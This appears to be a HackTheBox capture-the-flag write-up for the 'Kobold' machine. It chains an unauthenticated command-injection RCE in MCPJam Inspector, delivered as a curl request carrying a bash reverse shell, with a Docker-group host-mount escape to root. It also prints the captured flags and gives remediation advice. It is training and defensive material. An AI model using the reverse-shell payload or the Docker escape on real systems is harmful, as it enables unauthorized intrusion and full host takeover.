# HackTheBox — Kobold

| Field | Details |
|-------|---------|
| **Difficulty** | Easy |
| **OS** | Linux (Ubuntu 24.04) |
| **Target IP** | 10.129.48.182 |
| **Attack IP** | 10.10.14.124 |
| **Author** | thrandomv |
| **Date** | March 2026 |

---

## Executive Summary

Kobold is an Easy-rated Linux machine on HackTheBox centered around modern AI tooling misconfigurations and container security failures. The attack chain begins with virtual host enumeration exposing an MCPJam Inspector instance vulnerable to unauthenticated Remote Code Execution (CVE-2026-23744). An initial shell is obtained as user `ben`, who holds a dormant Docker group membership. Activating it via `newgrp docker` allows a trivial container escape — mounting the host filesystem into a privileged container — leading to full root access and both flags.

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Initial Access — CVE-2026-23744](#2-initial-access--cve-2026-23744)
3. [Shell Stabilization](#3-shell-stabilization)
4. [User Flag](#4-user-flag)
5. [Post-Exploitation Enumeration](#5-post-exploitation-enumeration)
6. [Privilege Escalation — Docker Group Abuse](#6-privilege-escalation--docker-group-abuse)
7. [Root Flag](#7-root-flag)
8. [Attack Chain Summary](#8-attack-chain-summary)
9. [Vulnerability Summary](#9-vulnerability-summary)
10. [Remediation](#10-remediation)

---

## 1. Reconnaissance

### /etc/hosts

The TLS certificate on port 443 exposes a wildcard SAN (`*.kobold.htb`), confirming virtual host routing is in use. Add all relevant subdomains upfront:

```bash
echo "10.129.48.182 kobold.htb mcp.kobold.htb bin.kobold.htb" | sudo tee -a /etc/hosts
```

### Port Scanning

```bash
nmap -sC -sV -p- --min-rate 5000 -oA kobold 10.129.48.182
```

**Results:**

| Port | State | Service | Version |
|------|-------|---------|---------|
| 22 | open | ssh | OpenSSH 9.6p1 Ubuntu |
| 80 | open | http | nginx 1.24.0 — redirects to HTTPS |
| 443 | open | ssl/http | nginx 1.24.0 — "Kobold Operations Suite" |
| 3552 | open | http | Golang net/http — GetArcane Docker Manager |

Port 3552 stands out: a Golang-based Docker management panel. The wildcard SAN on the TLS cert confirms multiple subdomains are in use.

### Virtual Host Enumeration

```bash
ffuf -u https://kobold.htb -H "Host: FUZZ.kobold.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -k -t 200 -mc 200,301,302 -s
```

**Discovered subdomains:**

- `https://mcp.kobold.htb` — **MCPJam Inspector**: a developer tool for testing MCP (Model Context Protocol) servers. Exposes a REST API at `/api/mcp/connect`.
- `https://bin.kobold.htb` — **PrivateBin 2.0.2**: encrypted pastebin running in Docker, only accessible internally on port 8080.
- `http://kobold.htb:3552` — **GetArcane v1.13.0**: Docker management UI running as root.

### API Enumeration

Confirm the MCPJam API is accessible and map its endpoints:

```bash
curl -s http://mcp.kobold.htb:3552/api/openapi.json | \
  python3 -c "import json,sys; [print(p) for p in json.load(sys.stdin)['paths']]"
```

Key endpoint identified: `/api/mcp/connect` — accepts a `serverConfig` object with a `command` field. No authentication required.

---

## 2. Initial Access — CVE-2026-23744

### Vulnerability

**CVE-2026-23744** (GHSA-232v-j27c-5pp6) — Unauthenticated RCE in MCPJam Inspector.

The `/api/mcp/connect` endpoint passes the `serverConfig.command` field directly to Node.js `child_process.spawn()` without sanitization or authentication. Any attacker with network access can execute arbitrary OS commands as the user running the MCPJam process.

### Verification

Test command execution with a benign payload:

```bash
curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"serverId":"test","serverConfig":{"command":"id","args":[],"env":{}}}'
```

```json
{"success":false,"error":"Connection failed for server test: MCP error -32000: Connection closed"}
```

The `id` command executes and exits immediately (not a valid MCP server), confirming arbitrary command execution. The error is from the MCP handshake failing — not from a blocked command.

### Exploit — Reverse Shell

**Terminal 1 — listener:**

```bash
nc -lvnp 4444
```

**Terminal 2 — exploit:**

```bash
curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{
    "serverId": "pwn",
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "bash -i >& /dev/tcp/10.10.14.124/4444 0>&1"],
      "env": {}
    }
  }'
```

**Shell received:**

```
listening on [any] 4444 ...
connect to [10.10.14.124] from (UNKNOWN) [10.129.48.182] 40688
bash: cannot set terminal process group (1529): Inappropriate ioctl for device
bash: no job control in this shell
ben@kobold:/usr/local/lib/node_modules/@mcpjam/inspector$
```

Initial shell as `ben` confirmed. Working directory is the MCPJam Inspector Node.js application root.

---

## 3. Shell Stabilization

The raw shell will die on `Ctrl+C` and has no job control. Stabilize it fully:

```bash
# Step 1 — spawn PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Step 2 — background
# Press Ctrl+Z

# Step 3 — fix local terminal and foreground
stty raw -echo; fg

# Step 4 — set terminal type
export TERM=xterm
```

Result: fully interactive shell with tab completion, arrow keys, and `Ctrl+C` support.

---

## 4. User Flag

```bash
cat /home/ben/user.txt
```

```
656bbb9a07380a2d5cc44557d09e7306
```

✅ **User flag captured.**

---

## 5. Post-Exploitation Enumeration

### User Context

```bash
id
```

```
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

### Network Services

```bash
ss -tunlp
```

```
tcp  LISTEN  127.0.0.1:8080   docker-proxy (PrivateBin)
tcp  LISTEN  *:3552            arcane_linux_amd64
tcp  LISTEN  127.0.0.1:6274   node (MCPJam Inspector)
```

PrivateBin is only accessible on localhost — bound to the Docker bridge. Arcane is exposed on all interfaces and runs as root.

### Running Processes

```bash
ps aux --sort=-%mem | head -10
```

```
root   1492   /root/arcane_linux_amd64
root   1949   /usr/bin/docker-proxy ... -host-port 8080 -container-ip 172.17.0.2
ben    1585   node /usr/local/bin/inspector
```

Arcane runs as root. PrivateBin container IP is `172.17.0.2`.

### Group Membership

```bash
cat /etc/group | grep docker
```

```
docker:x:111:alice
```

`ben` is not listed — but `newgrp docker` works without a password due to PAM-level group assignment. This is the privilege escalation vector.

---

## 6. Privilege Escalation — Docker Group Abuse

### Activate Docker Group

```bash
newgrp docker
```

Verify:

```bash
id
```

```
uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)
```

`gid=111(docker)` — Docker group is now active.

### Confirm Container Access

```bash
docker ps
```

```
CONTAINER ID   IMAGE                               STATUS      PORTS                      NAMES
4c49dd7bb727   privatebin/nginx-fpm-alpine:2.0.2   Up 6 hours  127.0.0.1:8080->8080/tcp   bin
```

The `privatebin/nginx-fpm-alpine:2.0.2` image is already pulled locally — no outbound internet access needed.

### Container Escape

Docker group membership is functionally equivalent to root. We mount the entire host filesystem into a container and run as root inside it:

```bash
docker run -it --rm --user root --entrypoint /bin/sh \
  -v /:/mnt privatebin/nginx-fpm-alpine:2.0.2
```

| Flag | Purpose |
|------|---------|
| `-it` | Interactive TTY |
| `--rm` | Auto-remove on exit |
| `--user root` | Run as root inside container |
| `--entrypoint /bin/sh` | Override default entrypoint |
| `-v /:/mnt` | Mount host root at `/mnt` |

Shell drops into the container as root with the full host filesystem at `/mnt`.

---

## 7. Root Flag

```bash
# Confirm root
id
# uid=0(root) gid=0(root)

# Read root flag
cat /mnt/root/root.txt
```

```
bff6765848d93de397b0095bebfbf719
```

✅ **Root flag captured. Machine owned.**

---

## 8. Attack Chain Summary

```
[Recon]
nmap → ports 22, 80, 443, 3552
SSL SAN wildcard → mcp.kobold.htb, bin.kobold.htb
Port 3552 → GetArcane v1.13.0 (Golang, runs as root)
        |
        v
[Web Enum]
https://mcp.kobold.htb → MCPJam Inspector
/api/mcp/connect → serverConfig.command → no auth, no sanitization
        |
        v
[Initial Access — CVE-2026-23744]
POST /api/mcp/connect
{"serverId":"pwn","serverConfig":{"command":"bash","args":["-c","bash -i >& /dev/tcp/10.10.14.124/4444 0>&1"]}}
→ Reverse shell as ben
→ user.txt: 656bbb9a07380a2d5cc44557d09e7306
        |
        v
[Enumeration]
id → groups: operator(37), docker dormant via PAM
docker:x:111 in /etc/group — newgrp docker works without password
        |
        v
[Privilege Escalation — Docker Group Abuse]
newgrp docker → gid=111(docker) activated
docker run -it --rm --user root --entrypoint /bin/sh -v /:/mnt privatebin/nginx-fpm-alpine:2.0.2
→ Root in container, host / mounted at /mnt
→ root.txt: bff6765848d93de397b0095bebfbf719
```

---

## 9. Vulnerability Summary

| # | Vulnerability | CVE | Severity | Impact |
|---|--------------|-----|----------|--------|
| 1 | MCPJam Inspector Unauthenticated RCE | CVE-2026-23744 | Critical (CVSS 9.8) | Initial shell as `ben` |
| 2 | Docker Group Privilege Escalation | N/A | Critical | Full root via container escape |

---

## 10. Remediation

### CVE-2026-23744 — MCPJam RCE

- Never expose MCPJam Inspector to untrusted networks — it is a developer tool designed for local use only
- Implement API key authentication on all `/api/mcp/*` endpoints
- Whitelist allowed binaries for `serverConfig.command` — reject arbitrary paths
- Run MCPJam as an unprivileged user with no shell access

### Docker Group Misconfiguration

- Treat Docker group membership as root-equivalent — audit all members immediately
- Remove `ben` from Docker group unless operationally required
- Enable Docker `--userns-remap` to map container root to an unprivileged host UID
- Audit PAM configuration to prevent `newgrp` escalation into security-sensitive groups
- Consider switching to rootless Docker or Podman (rootless by default)
- Implement AppArmor/SELinux profiles to restrict container capabilities on the host

---

*Written by thrandomv — HackTheBox, March 2026*
